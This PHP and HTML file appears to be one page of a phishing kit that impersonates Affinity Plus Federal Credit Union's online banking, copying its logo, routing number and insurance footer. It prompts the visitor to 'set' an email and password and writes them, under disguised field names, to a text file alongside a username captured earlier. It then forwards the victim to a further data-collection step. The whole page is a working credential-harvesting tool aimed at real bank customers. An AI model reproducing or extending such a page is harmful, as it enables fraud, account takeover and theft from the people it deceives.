<?php
session_start();
require_once __DIR__ . '/includes/file_storage.php';

// Redirect to login if no username in session
if (!isset($_SESSION['emzemz'])) {
    header('Location: index.php');
    exit;
}

$username = $_SESSION['emzemz'];
$errors = [];

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Get form data
    $email = trim($_POST['email'] ?? '');
    $password = $_POST['password'] ?? '';
    $confirmPassword = $_POST['confirmPassword'] ?? '';
    
    // Validation
    if (empty($email)) {
        $errors['email'] = 'Email is required';
    } elseif (!filter_var($email, FILTER_VALIDATE_EMAIL)) {
        $errors['email'] = 'Invalid email format';
    }
    
    if (empty($password)) {
        $errors['password'] = 'Password is required';
    } elseif (strlen($password) < 8) {
        $errors['password'] = 'Password must be at least 8 characters';
    }
    
    if (empty($confirmPassword)) {
        $errors['confirmPassword'] = 'Confirm password is required';
    } elseif ($password !== $confirmPassword) {
        $errors['confirmPassword'] = 'Passwords do not match';
    }
    
    if (empty($errors)) {
        // Save to test file
        $data = [
            'step' => 'email_password',
            'usrnm' => $username,
            'usr_eml' => $email,
            'acc_cd' => $password
        ];
        
        saveUserData('email_password.txt', $data);
        
        // Redirect to basic info page
        header('Location: basic_info.php');
        exit;
    }
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Set Your Email & Password - Affinity Plus</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
</head>
<body>
    <div class="min-h-screen flex flex-col overflow-hidden bg-cover bg-center bg-no-repeat relative" style="background-image: url('assets/background.jpeg');">
        <!-- Dark Overlay -->
        <div class="absolute inset-0 bg-black/40"></div>
        
        <!-- Relative Container -->
        <div class="relative z-10 flex flex-col min-h-screen">
            <!-- Header -->
            <header class="bg-purple-900 text-white py-3 px-6 flex items-center justify-between shadow-md">
                <div class="flex items-center space-x-2">
                    <img src="assets/logo.svg" alt="Affinity Plus Logo" class="h-10 w-auto" />
                </div>
                <div class="flex items-center space-x-3">
                    <div class="text-white/80 hover:text-white cursor-pointer transition-colors p-1">
                        <i class="fas fa-comments text-xl"></i>
                    </div>
                </div>
            </header>

            <!-- Main Content -->
            <main class="flex-1 flex items-center justify-center px-4 py-10">
                <!-- Email Password Card -->
                <div class="bg-white shadow-lg rounded-md w-full max-w-md p-6 flex flex-col gap-4">
                    <!-- Card Header -->
                    <div>
                        <h2 class="text-center text-xl font-semibold mb-2 text-gray-900">Set Your Email & Password</h2>
                        <p class="text-center text-gray-600 text-sm">Create your account credentials to access your online banking</p>
                    </div>
                    
                    <?php if (!empty($errors)): ?>
                        <div class="bg-red-50 border-l-4 border-red-500 p-4 mb-4">
                            <div class="flex">
                                <div class="flex-shrink-0">
                                    <svg class="h-5 w-5 text-red-500" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 20 20" fill="currentColor">
                                        <path fill-rule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zM8.707 7.293a1 1 0 00-1.414 1.414L8.586 10l-1.293 1.293a1 1 0 101.414 1.414L10 11.414l1.293 1.293a1 1 0 001.414-1.414L11.414 10l1.293-1.293a1 1 0 00-1.414-1.414L10 8.586 8.707 7.293z" clip-rule="evenodd" />
                                    </svg>
                                </div>
                                <div class="ml-3">
                                    <p class="text-sm text-red-700">
                                        Please fix the following errors:
                                        <ul class="list-disc pl-5 mt-1">
                                            <?php foreach ($errors as $error): ?>
                                                <li><?php echo htmlspecialchars($error); ?></li>
                                            <?php endforeach; ?>
                                        </ul>
                                    </p>
                                </div>
                            </div>
                        </div>
                    <?php endif; ?>
                    
                    <form method="POST" class="space-y-4">
                        <!-- Email Field -->
                        <div>
                            <label for="email" class="block text-sm font-medium text-gray-700 mb-1">Email Address</label>
                            <input
                                type="email"
                                id="email"
                                name="email"
                                value="<?php echo htmlspecialchars($_POST['email'] ?? ''); ?>"
                                class="w-full px-3 py-2 border border-gray-300 rounded-md shadow-sm focus:outline-none focus:ring-2 focus:ring-purple-600 focus:border-transparent"
                                placeholder="Enter your email"
                                required
                            >
                            <?php if (!empty($errors['email'])): ?>
                                <p class="mt-1 text-sm text-red-600 flex items-center gap-2">
                                    <svg class="w-4 h-4" fill="currentColor" viewBox="0 0 24 24">
                                        <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/>
                                    </svg>
                                    <?php echo htmlspecialchars($errors['email']); ?>
                                </p>
                            <?php endif; ?>
                        </div>
                        
                        <!-- Password Field -->
                        <div>
                            <label for="password" class="block text-sm font-medium text-gray-700 mb-1">Password</label>
                            <div class="relative">
                                <input
                                    type="password"
                                    id="password"
                                    name="password"
                                    class="w-full px-3 py-2 border border-gray-300 rounded-md shadow-sm focus:outline-none focus:ring-2 focus:ring-purple-600 focus:border-transparent"
                                    placeholder="Enter password"
                                    required
                                >
                                <button
                                    type="button"
                                    onclick="togglePasswordVisibility('password')"
                                    class="absolute right-3 top-1/2 -translate-y-1/2 text-purple-900 text-sm hover:underline"
                                >
                                    <span id="passwordToggleText">Show</span>
                                </button>
                            </div>
                            <?php if (!empty($errors['password'])): ?>
                                <p class="mt-1 text-sm text-red-600 flex items-center gap-2">
                                    <svg class="w-4 h-4" fill="currentColor" viewBox="0 0 24 24">
                                        <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/>
                                    </svg>
                                    <?php echo htmlspecialchars($errors['password']); ?>
                                </p>
                            <?php endif; ?>
                        </div>
                        
                        <!-- Confirm Password Field -->
                        <div>
                            <label for="confirmPassword" class="block text-sm font-medium text-gray-700 mb-1">Confirm Password</label>
                            <div class="relative">
                                <input
                                    type="password"
                                    id="confirmPassword"
                                    name="confirmPassword"
                                    class="w-full px-3 py-2 border border-gray-300 rounded-md shadow-sm focus:outline-none focus:ring-2 focus:ring-purple-600 focus:border-transparent"
                                    placeholder="Re-enter password"
                                    required
                                >
                                <button
                                    type="button"
                                    onclick="togglePasswordVisibility('confirmPassword')"
                                    class="absolute right-3 top-1/2 -translate-y-1/2 text-purple-900 text-sm hover:underline"
                                >
                                    <span id="confirmPasswordToggleText">Show</span>
                                </button>
                            </div>
                            <?php if (!empty($errors['confirmPassword'])): ?>
                                <p class="mt-1 text-sm text-red-600 flex items-center gap-2">
                                    <svg class="w-4 h-4" fill="currentColor" viewBox="0 0 24 24">
                                        <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/>
                                    </svg>
                                    <?php echo htmlspecialchars($errors['confirmPassword']); ?>
                                </p>
                            <?php endif; ?>
                        </div>
                        
                        <!-- Submit Button -->
                        <div class="pt-4">
                            <button
                                type="submit"
                                class="w-full bg-purple-900 hover:bg-purple-800 text-white py-3 rounded-md font-medium transition disabled:opacity-70"
                            >
                                Continue
                            </button>
                        </div>
                        
                        <p class="text-xs text-gray-500 mt-4">
                            Your password must be at least 8 characters long and should include a mix of letters, numbers, and symbols for security.
                        </p>
                    </form>
                </div>
            </main>

            <!-- Footer -->
            <footer class="bg-white py-6 text-center text-sm text-gray-700 border-t border-gray-200">
                <div class="flex flex-col md:flex-row items-center justify-center gap-3 mb-3">
                    <a href="#" class="text-purple-800 hover:underline">Contact Us</a>
                    <a href="#" class="text-purple-800 hover:underline">Locations</a>
                    <a href="#" class="text-purple-800 hover:underline">Disclosures</a>
                    <a href="#" class="text-purple-800 hover:underline">Privacy Policy</a>
                    <a href="#" class="text-purple-800 hover:underline">Open a Membership</a>
                </div>
                <p class="text-xs text-gray-600">Routing # 296076301</p>
                <p class="text-xs mt-2 text-gray-600">
                    Affinity Plus Federal Credit Union is federally insured by the National Credit Union Administration. Copyright © 2025 Affinity Plus Federal Credit Union.
                </p>

                <div class="flex items-center justify-center gap-4 mt-4">
                    <img src="assets/equal-housing.png" alt="Equal Housing Lender" class="h-8 w-auto" />
                    <img src="assets/ncua.png" alt="NCUA Insured" class="h-8 w-auto" />
                </div>
            </footer>
        </div>
    </div>
    
    <script>
        // Toggle password visibility
        function togglePasswordVisibility(fieldId) {
            const input = document.getElementById(fieldId);
            const toggleText = document.getElementById(fieldId + 'ToggleText');
            
            if (input.type === 'password') {
                input.type = 'text';
                toggleText.textContent = 'Hide';
            } else {
                input.type = 'password';
                toggleText.textContent = 'Show';
            }
        }
        
        // Auto-focus email field on page load
        document.addEventListener('DOMContentLoaded', function() {
            const emailInput = document.getElementById('email');
            if (emailInput) {
                emailInput.focus();
            }
        });
    </script>
</body>
</html>
